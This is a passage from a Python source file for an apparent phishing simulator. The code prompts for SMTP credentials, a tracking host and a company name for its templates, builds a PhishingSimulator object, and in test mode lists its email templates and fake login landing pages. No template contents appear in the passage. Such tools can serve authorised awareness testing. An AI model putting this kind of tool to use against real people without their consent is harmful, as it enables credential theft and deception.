        default="http://127.0.0.1:5000"
    ).ask()
    
    # Company name for templates
    company_name = questionary.text(
        "Company Name (for templates):",
        default="SecurePortal"
    ).ask()
    
    # Create simulator
    simulator = PhishingSimulator(
        smtp_host=smtp_host,
        smtp_port=int(smtp_port),
        smtp_username=smtp_user,
        smtp_password=smtp_pass,
        tracking_host=tracking_host,
        company_name=company_name,
    )
    
    return simulator


if __name__ == "__main__":
    # Test mode
    print("--- Phishing Module Test Mode ---")
    print("Available templates:", list(EMAIL_TEMPLATES.keys()))
    print("Available landing pages:", list(FAKE_LOGIN_TEMPLATES.keys()))
